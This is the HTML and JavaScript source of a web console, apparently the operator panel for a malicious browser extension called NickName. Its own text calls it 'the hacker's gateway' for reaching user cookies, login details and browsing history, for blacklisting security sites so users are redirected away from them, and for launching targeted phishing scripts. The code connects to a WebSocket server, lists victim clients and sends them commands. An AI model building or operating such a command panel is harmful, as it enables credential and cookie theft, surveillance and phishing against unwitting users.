<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SpeedDemon</title>
    <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
	  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
		<script>
			var HOST = location.origin.replace(/^http/, 'ws');
			var serverID = "0";
var ws = new WebSocket(HOST);  
var sites = new Array();

function resetSocket(){//fix for reseting sockets
    console.log("reseting socket");
    ws= new WebSocket(HOST);
    ws.onclose = function(){
        setTimeout(resetSocket, 1000);
    };
}
ws.onclose = function(){
		console.log("reseting socket");
    setTimeout(resetSocket, 1000);
};

ws.onopen = function(event){
    var jsonPackage ={type:'getList'};
    ws.send(JSON.stringify(jsonPackage));
    console.log("Request sent");
    var jsonPackage ={type:'getClients'};
    ws.send(JSON.stringify(jsonPackage));
    console.log("Request sent");
}

ws.onmessage = function(e){
    document.getElementById('p1').innerHTML +="\n"+e.data;

    console.log(e.data);
    object = JSON.parse(e.data);
    switch(object.type){
        case 'blackList':
            sites = object.allSites;
            console.log(object.allSites);
            console.log("got something");
            sites.forEach(site => {
            node = document.getElementById("blacklist");
            aRow = document.createElement("li");
            aRow.classList.add("list-group-item");
            aCol = document.createTextNode(site);
            node.appendChild(aRow);
            aRow.appendChild(aCol);
            });
        case 'statusList':
            console.log("got a status");
            var ids = object.ids;
            var statuses = object.status;
            object.ids.forEach(id =>{
                makeCard(id);
            });
        case 'idHistory':
        case 'cookie':
        case 'username':
        case 'password':
    }    
}

function blackList(){
    var jsonPackage = {id: 0, type:'list', addString: URL};
    ws.send(JSON.stringify(jsonPackage));
}
window.addEventListener("hashchange", function() { scrollBy(0, -70) });

function send() {
var id = document.getElementById('id').value;
var type = document.getElementById('type').value;
var dataType = document.getElementById('dataType').value;
var data = document.getElementById('data').value;
if (document.getElementById('data2').value!=""){
    if (document.getElementById('data3').value!=""){
    var data2 = document.getElementById('data2').value;
    var data3 = document.getElementById('data3').value;
    var dataType2 = document.getElementById('dataType2').value;
    var dataType3 = document.getElementById('dataType3').value;
    var obj = { id: id, type: type, [dataType]: data, [dataType2]: data2, [dataType3]: data3};
    }
    else{
    var data2 = document.getElementById('data2').value;
    var dataType2 = document.getElementById('dataType2').value;
    var obj = { id: id, type: type, [dataType]: data, [dataType2]: data2};
    //var obj = { id: serverID, type: type, [dataType]: data, [dataType2]: data2};
    }
}
else {
    if (dataType=="history"){
    var arr = ["google.com","youtube.com","facebook.com","twitter.com","walmart.com","microsoft.com"];
    var obj = { id: id, type: type, [dataType]: arr };
    }
    else
    var obj = { id: id, type: type, [dataType]: data };
}
    console.log('sending '+obj);
    ws.send(JSON.stringify(obj));
}


window.userCount = 0;   // Declare a global variable
			        //This global var is used to give each new user card added a different id

function makeCard(id) {
    userCount++;
    
    var cardInfo = document.getElementById("infoCard");
    var card = cardInfo.cloneNode(true);
    //Clones info card to be turned into a user card
    card.id = userCount; //gives card a unique id

    var header = card.children[0];
    var link = header.children[0];
    link.innerHTML = id;
    link.id = "link" + userCount; //prepends "link" to id so it's diff than card id

    link.href = "#collapse" + userCount;
    //href can't begin with a number 

    var collapse = card.children[1];
    collapse.id = "collapse" + userCount;

    var body = collapse.children[0];
    body.id = "body" + userCount;
    body.innerHTML = "";
    //body will be filled in by other functions

    //add new card to accordion
    var addTo = document.getElementById("accordion");
    addTo.appendChild(card);
}

function blackList(){
    var jsonPackage = {id: 0, type:'list', addString: URL};
    ws.send(JSON.stringify(jsonPackage));
}
		</script>
  </head>

  

  <body data-spy = "scroll" data-target=".navbar">

	<nav class="navbar navbar-expand-sm bg-dark navbar-dark fixed-top">
		<a class="navbar-brand" href="#">NickName123</a>
		<ul class = "navbar-nav">
			<li class="nav-item">
				<a class="nav-link" href="#userSection">Users</a>
			</li>
			<li class = "nav-item">
				<a class="nav-link" href="#blackListSection">Blacklist</a>
			</li>
		</ul>
	</nav>

	<!-- Logo And Name -->
	<div class = "jumbotron">
		<h1 class = "display-4">NickName Console</h1>
		<p class = "lead">
			This website is the hacker's gateway to the NickName extension. This interface will allow you to access user cookies and history, create a black list of security sites to redirect users from, and launch targeted phishing and other such scripts at users. Happy hacking!
		</p>
		<hr class="my-4">
		<p>Note: We are not responsible for any privacy breaches, as all permissions have been given by users of our application to access their data.</p>
	</div>  

	<div id = "userSection">
	
		<div class="container-fluid">
			<h3>All Users</h3>
			<p><strong>Note:</strong> The <strong>data-parent</strong> attribute makes sure that all collapsible elements under the specified parent will be closed when one of the collapsible item is shown.</p>
			<div id="accordion">
          <div id="infoCard" class="card">
              <div id="infoCardHeader" class="card-header">
                <a id="infoCardLink" class="card-link" data-toggle="collapse" href="#infoCardCollapse">Info
                </a>
              </div>
              <div id="infoCardCollapse" class="collapse" data-parent="#accordion">
                <div id="infoCardBody" class="card-body">Click an ID to view its cookies, login details. and history.
                </div>
              </div>
            </div>
			</div>
		</div>

	</div>	
	<!-- Spacing things Out -->
	<br><br>

	<div class = "ml-3">
    <div id = "blackListSection">

	<h4>Blacklisted Sites</h4>
    <ul class = "list-group" id="blacklist"></ul>
    
    <br>

    <!-- Adding Blacklisted Site -->
    <h4>Add Site to Blacklist Here</h4>
    <input type="text" class="form-control blacklist" placeholder="URL">
    <button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>
	
	</div>
	</div>
  </div>
  
  <form onsubmit="send();return false;">
    ID: <input type="text" id="id"><br>
    Type: <input type="text" id="type"><br>
    <input type="text" id="dataType">: <input type="text" id="data"><br>
    <input type="text" id="dataType2">: <input type="text" id="data2"><br>
    <input type="text" id="dataType3">: <input type="text" id="data3"><br>
    <input type="submit" value="Submit">
  </form>
  <p id="p1">Recieved data will show here:</p>


  </body>

  

</html>
